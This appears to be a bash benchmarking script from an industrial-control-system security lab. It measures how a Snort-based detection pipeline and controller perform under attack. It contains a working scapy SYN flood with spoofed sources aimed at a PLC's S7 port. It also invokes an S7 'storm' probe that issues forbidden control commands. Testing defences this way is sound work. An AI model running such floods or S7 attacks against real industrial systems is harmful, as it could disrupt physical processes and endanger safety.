#!/usr/bin/env bash
# night_ddos.sh — bounded sustained flood through the REAL pipeline
# (packets -> Snort mirror -> bridge -> controller), while sampling a probe
# attack's MTTM and the verdict correctness under load. (Script 6.)
# Honest scope: this drives real diverse-source packets at the detector, unlike
# the direct-POST bench, so it stresses Snort+bridge+controller together.
# Bounded rate so it never wedges the rig; cleans up and green-checks after.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; source "$HERE/night_lib.sh"
mttm_header
DUR="${DDOS_DUR:-300}"        # seconds of sustained flood per invocation
PPS="${DDOS_PPS:-200}"        # target diverse-source packets/s (bounded; raise cautiously)
CSV="$NIGHT_ROOT/logs/ddos.csv"; [ -f "$CSV" ] || echo "ts,alert_rate_s,cars_ms_avg,probe_mttm_ms,probe_resp" > "$CSV"

log "DDoS phase: ${DUR}s sustained, target ${PPS} pps diverse spoofed sources -> PLC1"
# diverse-source flood from the attacker namespace (rate-limited scapy)
sudo ip netns exec "$NS_ATK" python3 - "$PLC1" "$DUR" "$PPS" <<'PY' &
import sys,time,random,socket,struct
try:
    from scapy.all import IP,TCP,send,conf; conf.verb=0
    host,dur,pps=sys.argv[1],float(sys.argv[2]),float(sys.argv[3])
    end=time.time()+dur; gap=1.0/pps
    while time.time()<end:
        src="192.168.9.%d"%random.randint(1,254)
        send(IP(src=src,dst=host)/TCP(sport=random.randint(1024,65535),dport=102,flags="S"),verbose=0)
        time.sleep(gap)
except Exception as e:
    print("flood-fallback",e)
PY
FLOOD=$!
sleep 5
# sample under load: alert rate, controller decide time, and a probe MTTM
end=$((SECONDS+DUR)); off=$(sudo bash -c "wc -l < $ALERT" 2>/dev/null||echo 0)
while [ $SECONDS -lt $end ]; do
  sleep 25
  local_now=$(sudo bash -c "wc -l < $ALERT" 2>/dev/null||echo 0)
  arate=$(python3 -c "print(round(($local_now-$off)/25.0,1))" 2>/dev/null); off=$local_now
  cms=$(curl -s -m4 "$API/cars/status"|python3 -c 'import sys,json;print(json.load(sys.stdin).get("cars_ms_avg"))' 2>/dev/null)
  # probe: a distinct forbidden control from the SCADA vantage, measured under the load
  measure_attack ddos_probe "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --storm --secs 2 --hz 10
  pm=$(tail -1 "$NIGHT_ROOT/logs/mttm_all.csv"|awk -F, '{print $6}')
  pr=$(tail -1 "$NIGHT_ROOT/logs/mttm_all.csv"|awk -F, '{print $7}')
  echo "$(TS),$arate,${cms:-NA},${pm:-NA},${pr:-NA}" >> "$CSV"
  log "  under-load: alert_rate=${arate}/s cars_ms=${cms:-NA} probe_mttm=${pm:-NA}ms"
done
sudo pkill -f "netns exec $NS_ATK" 2>/dev/null; wait "$FLOOD" 2>/dev/null
clean_all_reactive; selfheal; sleep 3; greencheck || { arm; }
log "DDoS phase done"
